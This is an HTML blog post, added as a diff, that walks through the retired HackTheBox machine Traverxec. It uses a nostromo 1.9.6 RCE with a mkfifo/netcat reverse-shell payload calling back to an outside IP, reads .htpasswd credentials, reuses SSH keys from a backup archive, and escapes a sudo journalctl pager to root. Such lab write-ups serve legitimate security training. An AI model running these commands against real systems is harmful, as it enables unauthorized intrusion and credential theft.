@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Traverxec: nostromo RCE, a backup key, and journalctl to root — Lucky Thandel</title>
+<meta name="description" content="nostromo 1.9.6 homedir escape (CVE-2019-16278), SSH keys hiding in a backup archive, and a sudo journalctl pager escape for root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-15 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Traverxec: nostromo RCE, a backup key, and journalctl to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Traverxec is a retired HackTheBox easy Linux machine serving websites with nostromo 1.9.6 (nhttpd). Synopsis: a homedir-escape RCE (CVE-2019-16278), SSH keys hiding in a backup archive, and a sudo journalctl pager escape for root.</p>
+<h2><span class="amber">$</span> Enumeration — rare server, famous bug</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: read the Server banner</span>
+nmap -sC -sV -oN traverxec.nmap 10.10.10.165</pre>
+<p>The Server header says nostromo 1.9.6, which is CVE-2019-16278: a homedir-path RCE via crafted requests. Rare software, public exploit, short path — when version and exploit agree this cleanly, run it.</p>
+<h2><span class="amber">$</span> Foothold — nostromo RCE</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: homedir escape to shell</span>
+# public nostromo 1.9.6 exploit abuses homedir path handling:
+python3 nostromo-rce.py 10.10.10.165 80 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f&quot;
+nc -lvnp 4444   # shell as dawid</pre>
+<p>Catch the callback as the dawid service user, then enumerate files before passwords.</p>
+<h2><span class="amber">$</span> Lateral move — backup keys plus config creds</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: unlock the protected dir, reuse the key</span>
+cat /var/nostromo/conf/.htpasswd   # credential for the protected web dir
+ls ~/backup-ssh-identity-files.tgz
+tar xzf backup-ssh-identity-files.tgz
+ssh -i david_key david@10.10.10.165</pre>
+<p>The home hides a backup archive of SSH identity files, and the server config holds the protected-directory credential. Combine the two — credentials plus recovered key material — to SSH in as the fuller david user. Backup files are credential storage until proven otherwise.</p>
+<h2><span class="amber">$</span> Privilege escalation — sudo journalctl escape</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: pager escape to root</span>
+sudo -l   # (root) NOPASSWD: /usr/bin/journalctl
+sudo /usr/bin/journalctl
+!/bin/sh   # typed inside the less pager
+id   # uid=0(root)</pre>
+<p>journalctl pages through less, and less escapes to shell with !command. Sudo on any pager, editor, or interpreter is root — the GTFOBins entry for this pattern is worth memorizing. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Brute-forcing the protected web directory (its credential is on disk in the server config) and overlooking the backup archive.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch or replace rare web servers, keep SSH keys out of backups, and audit sudo against GTFOBins. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
